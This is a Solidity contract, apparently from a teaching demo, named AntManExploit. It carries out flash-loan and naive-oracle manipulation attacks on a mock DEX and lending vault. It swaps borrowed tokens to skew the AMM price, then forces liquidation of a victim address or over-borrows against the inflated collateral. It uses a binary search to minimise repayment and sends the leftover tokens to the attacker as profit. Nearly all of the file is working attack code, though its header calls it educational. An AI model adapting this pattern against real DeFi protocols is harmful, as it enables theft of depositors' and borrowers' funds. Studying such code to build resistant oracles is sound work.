// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {PymDEX} from "./PymDEX.sol";
import {StarkVault} from "./StarkVault.sol";
import {MockERC20} from "./MockERC20.sol";

/// @title AntManExploit
/// @notice Demonstrates flash-loan + naive oracle manipulation attacks.
/// @dev Educational/demo code only. Not safe for production.
contract AntManExploit {
    PymDEX public pym;
    StarkVault public vault;
    MockERC20 public tokenA;
    MockERC20 public tokenB;
    address payable public owner;

    constructor(address _pym, address _vault, address _tokenA, address _tokenB, address payable _owner) {
        pym = PymDEX(_pym);
        vault = StarkVault(_vault);
        tokenA = MockERC20(_tokenA);
        tokenB = MockERC20(_tokenB);
        owner = _owner;
    }

    /// @notice Execute flash-loan exploit for a given scenario
    /// @param loanAmount Amount of token to borrow in flash-loan
    /// @param wasp Victim address
    /// @param scenario 0 = liquidation, 1 = over-borrow fail, 2 = over-borrow success
    function execute(uint256 loanAmount, address wasp, uint8 scenario) external {
        if (scenario == 0) _scenarioLiquidation(loanAmount, wasp);
        else if (scenario == 1) _scenarioOverBorrowFail(loanAmount, wasp);
        else if (scenario == 2) _scenarioOverBorrowSuccess(loanAmount, wasp);
        else revert("invalid scenario");
    }

    /// @dev Scenario 0: Successful liquidation using flash-loan
    function _scenarioLiquidation(uint256 loanAmount, address wasp) internal {
        tokenA.approve(address(pym), loanAmount);
        pym.swapExactAForB(loanAmount, address(this));
        vault.liquidate(wasp);
        _finalize(tokenA, loanAmount);
    }

    /// @dev Scenario 1: Over-borrow fails due to AMM slippage
    function _scenarioOverBorrowFail(uint256 loanAmount, address /*wasp*/ ) internal {
        // Swap TokenA → TokenB; slippage reduces collateral value, over-borrow fails to repay loan
        tokenA.approve(address(pym), loanAmount);
        pym.swapExactAForB(loanAmount, address(this));
        _tryOverBorrow();
        _finalize(tokenA, loanAmount);
    }

    /// @dev Scenario 2: Over-borrow succeeds by using TokenB flash-loan
    function _scenarioOverBorrowSuccess(uint256 loanAmount, address /*wasp*/ ) internal {
        // Borrow TokenB instead of TokenA → avoids slippage trap, over-borrow succeeds
        tokenB.approve(address(pym), loanAmount);
        pym.swapExactBForA(loanAmount, address(this));
        _tryOverBorrow();
        _finalize(tokenB, loanAmount);
    }

    /// @dev Attempt over-borrow from vault using current collateral
    function _tryOverBorrow() internal {
        uint256 tokenAAfter = tokenA.balanceOf(address(this));
        if (tokenAAfter > 0) {
            tokenA.approve(address(vault), tokenAAfter);
            vault.depositCollateral(tokenAAfter);
            uint256 price = pym.getPymPrice(address(tokenA), address(tokenB));
            uint256 maxBorrow = (((tokenAAfter * price) / 1e18) * 50) / 100; // LTV 50%
            vault.borrow(maxBorrow);
        }
    }

    /// @dev Swap back tokens if needed and repay flash-loan
    function _finalize(MockERC20 loanToken, uint256 loanAmount) internal {
        if (address(loanToken) == address(tokenA)) {
            _swapBackAndRepay(tokenB, tokenA, loanAmount);
        } else if (address(loanToken) == address(tokenB)) {
            _swapBackAndRepay(tokenA, tokenB, loanAmount);
        }

        // Send remaining TokenB as profit to attacker
        uint256 profitB = tokenB.balanceOf(address(this));
        if (profitB > 0) {
            tokenB.transfer(owner, profitB);
        }
    }

    /// @dev Swaps enough tokens back to repay the flash-loan.
    /// @notice This function uses a binary search to find the minimum
    /// input amount needed to swap and generate enough output tokens
    /// to cover the flash-loan repayment. This optimizes the attacker's profit
    /// by minimizing slippage on the return swap.
    function _swapBackAndRepay(MockERC20 swapFrom, MockERC20 repayToken, uint256 loanAmount) internal {
        uint256 repayAmount = loanAmount;
        uint256 repayBalance = repayToken.balanceOf(address(this));

        if (repayBalance < repayAmount) {
            uint256 needed = repayAmount - repayBalance;
            uint256 swapBalance = swapFrom.balanceOf(address(this));

            uint256 left = 1;
            uint256 right = swapBalance;
            uint256 minSwap = right;
            bool enough = false;

            while (left <= right) {
                uint256 mid = (left + right) / 2;
                uint256 out;
                if (address(repayToken) == address(tokenA)) {
                    out = (pym.reserveA() * mid) / (pym.reserveB() + mid);
                } else {
                    out = (pym.reserveB() * mid) / (pym.reserveA() + mid);
                }

                if (out >= needed) {
                    minSwap = mid;
                    right = mid - 1;
                    enough = true;
                } else {
                    left = mid + 1;
                }
            }

            if (enough) {
                swapFrom.approve(address(pym), minSwap);
                if (address(repayToken) == address(tokenA)) pym.swapExactBForA(minSwap, address(this));
                else pym.swapExactAForB(minSwap, address(this));
            } else if (swapBalance > 0) {
                swapFrom.approve(address(pym), swapBalance);
                if (address(repayToken) == address(tokenA)) pym.swapExactBForA(swapBalance, address(this));
                else pym.swapExactAForB(swapBalance, address(this));
            }
        }

        // Transfer repayment
        uint256 repayFinal =
            repayToken.balanceOf(address(this)) < repayAmount ? repayToken.balanceOf(address(this)) : repayAmount;
        if (repayFinal > 0) {
            repayToken.transfer(msg.sender, repayFinal);
        }
    }
}
